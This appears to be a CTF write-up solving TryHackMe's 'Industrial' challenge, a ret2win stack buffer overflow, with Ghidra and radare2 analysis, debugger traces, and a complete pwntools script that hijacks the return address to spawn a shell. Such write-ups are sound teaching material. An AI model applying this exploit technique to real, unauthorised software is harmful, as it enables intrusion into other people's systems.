---
title: Industrial - TryHackMe CTF Writeup
excerpt: Solving a medium rated THM CTF pwn challenge.
mode: immersive
header:
  theme: dark
article_header:
  type: overlay
  theme: dark
  background_color: false
  background_image:
    gradient: 'linear-gradient(to right, rgba(0,0,0,0.0), rgba(0,0,0,0.4))'
    src: 'assets/images/articles/industrial-intrusion.png'
aside:
  toc: true
author: Mehul Singh
show_author_profile: true
mermaid: true
key: BabyEncryption.htb-03-07-2024
tags:
  - binary exploitation
  - buffer overflow
  - control flow hijack
  - debugging
  - exploit development
  - ghidra
  - pwn
  - radare2
  - ret2win
  - thm
  - x86_64
---

# Overview

Today we will work on [TryHackMe](http://tryhackme.com/)'s "Industrial" challenge. It was a medium rated pwn challenge and part of THM's [Industrial Intrusion](https://tryhackme.com/industrial-intrusion) CTF. It focused on buffer overflow's **ret2win** technique to cause the function return to jump to a desired function, while still being mindful of the stack structure. So let's begin!

_Note: Since this was a CTF challenge, the file might not be available. You can find the binary for this file in the **[resources](#resources)** section at the end._
{:.info}


# Initial Checks

## In-built Capabilities
```shell
$ pwn checksec --file ./industrial
[*] '/Path/To/industrial'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
Nice, we don't have canary and PIE enabled, which will make debugging and exploit development easier.

## Manual Test

As usual, let's just a feel of the program by running it.
```c
$ ./industrial
Enter the next command : Thanks
Thanks
$ ./industrial
Enter the next command : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thanks
Segmentation fault (core dumped)
$ ./industrial
Enter the next command : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thanks
Illegal instruction (core dumped)
```

By manual fuzzing we found something interesting. For small inputs (`<40 char`), it simply prints "Thanks" and exits, and on longer inputs (`>40 char`), it returns segmentation fault indicating a posible buffer overflow situation. But with an input of exactly `40 char`, it gives us **Illegal instruction (core dumped)**, which is really interesting as it indicates we are also tampering the instruction pointer somehow.

# Code Analysis

Let's jump into the actual implementation of code and disassemble it with ghidra first

## Ghidra Disassembly

The `main()` function is pretty straightforward:

```c
int main(void)

{
  undefined1 local_28 [32];

  FUN_004010c0(stdout,0,2,0);
  FUN_004010c0(stdin,0,2,0);
  FUN_004010c0(stderr,0,2,0);
  printf("Enter the next command : ");
  read(0,local_28,0x30);
  puts("Thanks");
  return 0;
}
```

where the `FUN_004010c0()`function  simply sets the provided stream to be buffered or not using [setvbuf()](https://pubs.opengroup.org/onlinepubs/009696599/functions/setvbuf.html) and then reads 48 bytes into a 32 bytes array, which could be an entry to buffer overflow attacks. But apart from that this function doesn't do much.

## Exploring Further

Upon checking other functions, we can see a `win()` function:
```c
void win(void)
{
  system("/bin/sh");
  return;
}
```
This spawns a shell and seems like our pathway ahead. Let's see if we can find a way to reach this function.

# Exploit

## Theory
Since we can overwrite the array in `main()` we could try to manipulate the return address in `main()`'s stack frame and jump to this `win()` function. We can verify this before developing our exploit by checking `main()`'s assembly code:

```as
┌ 166: int main (int argc, char **argv, char **envp);
│ afv: vars(1:sp[0x28..0x28])
│           0x004011d0      f30f1efa       endbr64
│           0x004011d4      55             push rbp
│           0x004011d5      4889e5         mov rbp, rsp
│           0x004011d8      4883ec20       sub rsp, 0x20
│           ...             ...            ...
```
So the `main()` function is allocating 32 bytes onto the stack, and the next 8 bytes are for previous base pointer and the next 8 after would be the return address, which as a matter of fact coincides with the 48 bytes we are able to overwrite through `local_28` array.

## Exploit Development

### Preliminary Test

This time lets work with radare2. So we load the binary, find the location of the `win()` function, set the breakpoint right after our input in `main()`.
```as
[0x0040125b]> pxq 80 @ rbp-32
0x7ffdae61f1f0  0x0000000000000000  0x00007f96e17a7900   .........yz.....
0x7ffdae61f200  0x0000000000000000  0x00007ffdae61f2a0   ..........a.....
0x7ffdae61f210  0x0000000000000001  0x00007f96e159dca8   ..........Y.....
0x7ffdae61f220  0x00007ffdae61f310  0x00000000004011d0   ..a.......@.....
0x7ffdae61f230  0x0000000100400040  0x00007ffdae61f328   @.@.....(.a.....
[0x0040125b]> dc
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
INFO: hit breakpoint at: 0x401260
[0x0040125b]> pxq 80 @ rbp-32
0x7ffdae61f1f0  0x4141414141414141  0x4141414141414141   AAAAAAAAAAAAAAAA
0x7ffdae61f200  0x4141414141414141  0x4141414141414141   AAAAAAAAAAAAAAAA
0x7ffdae61f210  0x000000000000000a  0x00007f96e159dca8   ..........Y.....
0x7ffdae61f220  0x00007ffdae61f310  0x00000000004011d0   ..a.......@.....
0x7ffdae61f230  0x0000000100400040  0x00007ffdae61f328   @.@.....(.a.....
```
This confirms we can overfill the array and overflow into the stack frame (the last `0x0a` replaced the value at rbp). So let's try replacing the return address now. We can create the binary payload to be directly entered in radare2 for this.

```python
from pwn import *

payload = b"A" * 32 + p64(0x01) + p64(0x004011b6)  # Overflow + new return address
with open("payload.bin", "wb") as f:
    f.write(payload)
```

I entered `0x0000000000000001` after the A's as I try to keep the same value at rbp so as to not mess the stack. Although since this rbp is already uncommon, it wouldn't matter if we use 40 A's instead. So we prepare our rarun file and run radare.

```bash
#!/usr/bin/rarun2

program=./industrial
stdin=./payload_0a.bin
```

```as
$ r2 -r run.rr2 -d industrial
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
[0x7fb5ab8f5440]> aaa
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze entrypoint (af@ entry0)
...
INFO: Recovering local variables (afva@@@F)
INFO: Use -AA or aaaa to perform additional experimental analysis
[0x7fb5ab8f5440]> pdf @ sym.win
┌ 26: sym.win ();
│           0x004011b6      f30f1efa       endbr64
│           0x004011ba      55             push rbp
│           0x004011bb      4889e5         mov rbp, rsp
│           0x004011be      488d053f0e..   lea rax, str._bin_sh    ; 0x402004 ; "/bin/sh"
│           0x004011c5      4889c7         mov rdi, rax
│           0x004011c8      e8c3feffff     call sym.imp.system     ; int system(const char *string)
│           0x004011cd      90             nop
│           0x004011ce      5d             pop rbp
└           0x004011cf      c3             ret
[0x7fb5ab8f5440]> db 0x004011c8
[0x7fb5ab8f5440]> db 0x004011cd
[0x7fb5ab8f5440]> dc
Enter the next command : Thanks
INFO: hit breakpoint at: 0x4011c8
[0x004011c8]> dc
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 si_pid=0 ret=0
[0x7f764c1d2df4]>
```

So we do see that we entered the `win()` function, but it returned a segmentation fault when continued, and specifically it SIGSEGVs within the `system()` function due to the [SIGNAL 11](https://man7.org/linux/man-pages/man7/signal.7.html) before reaching the next breakpoint. But why? One possible reason could us messing with the `rbp` value, and the `system()` function when making internal calls tried referencing some restricted `rbp+offset` value. But we tried to put the same `rbp` value we saw so please let me know if you know. But for now, we can try skipping the function prologue so as to not push weird values onto the stack and go straight to the function (at `0x004011be`) and run the program again similarly.

### Testing exploit

```as
[0x7f764c3b2440]> db 0x004011c8
[0x7f764c3b2440]> db 0x004011cd
[0x7f764c3b2440]> dc
Enter the next command : Thanks
INFO: hit breakpoint at: 0x4011c8
[0x004011c8]> dc
(48434) Created process 48491
[0x7ffab8ba77a9]> dc
[+] SIGNAL 17 errno=0 addr=0x3e80000bd6b code=1 si_pid=48491 ret=0
[+] signal 17 aka SIGCHLD received 0 (Child)
[0x7ffab8b30a14]> dc
INFO: hit breakpoint at: 0x4011cd
[0x004011cd]> dc
```

This confirms we succesfully created a Bash process, but since it's not connected to a terminal, we cannot access it directly. So let's create a python program to input a payload and give us an interactive session. Below is the logic for it:

```py
def exploit(proc):
    proc.recvuntil(b"Enter the next command : ")
    payload = b"A" * 32 + p64(0x01) + p64(0x004011be, endianness='little')
    proc.sendline(payload)
    proc.interactive()
```

<video style="width:100%; height:100%; border-radius:6px" controls autoplay muted loop>
    <source src="/assets/images/articles/industrial.mp4">
</video>

And with this we exploited the binary to provide us the flag!

## Complete Exploit

```python
from pwn import *

def exploit(proc, attach=False):
    proc.recvuntil(b"Enter the next command : ")
    if attach:
        gdb.attach(proc, gdbscript='b *0x00401260\nc')
        pause()
    payload = b"A" * 32 + p64(0x01, endianness='little') + p64(0x4011be, endianness='little')
    proc.sendline(payload)
    proc.interactive()

def main():
    context.log_level = 'error' 
    context.terminal = ['tmux', 'splitw', '-h']
    elf = context.binary = ELF('/home/mehul/Documents/Codes/challenges/industrial/industrial')
    proc = None
    try:
        proc = process(elf.path)
        output = exploit(proc, attach=False)
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if proc is not None:
            proc.close()

if __name__ == "__main__":
    main()
```

# Resources

- [Industrial.zip](/assets/data/industrial.zip) (SHA256sum: 11e8de6b5c747a6e018fc7e4c86396acab9f67ed7051832cb45b216272731837)
